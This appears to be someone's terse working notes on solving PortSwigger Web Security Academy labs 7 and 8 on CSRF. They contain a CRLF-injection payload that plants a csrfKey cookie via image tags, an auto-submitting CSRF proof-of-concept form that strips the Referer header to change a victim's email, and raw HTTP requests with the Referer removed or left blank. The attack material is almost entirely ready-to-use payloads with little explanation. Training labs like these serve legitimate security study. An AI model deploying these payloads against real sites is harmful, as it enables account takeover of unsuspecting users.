

<img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=JMZbEEhQbNIc3hqAjyn2Y3atpzESGXU2" onerror="document.forms[0].submit()">
<img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=csrf" onerror="document.forms[0].submit()"> 



7. CSRF where Referer validation depends on header being present

	delele the header from http request then csrf poc

	<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
	<head> <meta name="referrer" content="no-referrer"> </head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

delete full referar header

POST /email/change-email HTTP/1.1
Host: ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
Connection: close
Cookie: session=tv991TkKhJQ4MDL3CN65wOUfdCZkGVVm
Upgrade-Insecure-Requests: 1

email=a%40a.com

8. CSRF with broken Referer validation

POST /email/change-email HTTP/1.1
Host: ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
Connection: close
Referer:
Cookie: session=tv991TkKhJQ4MDL3CN65wOUfdCZkGVVm
Upgrade-Insecure-Requests: 1

email=a%40a.com


keep the referar header blank


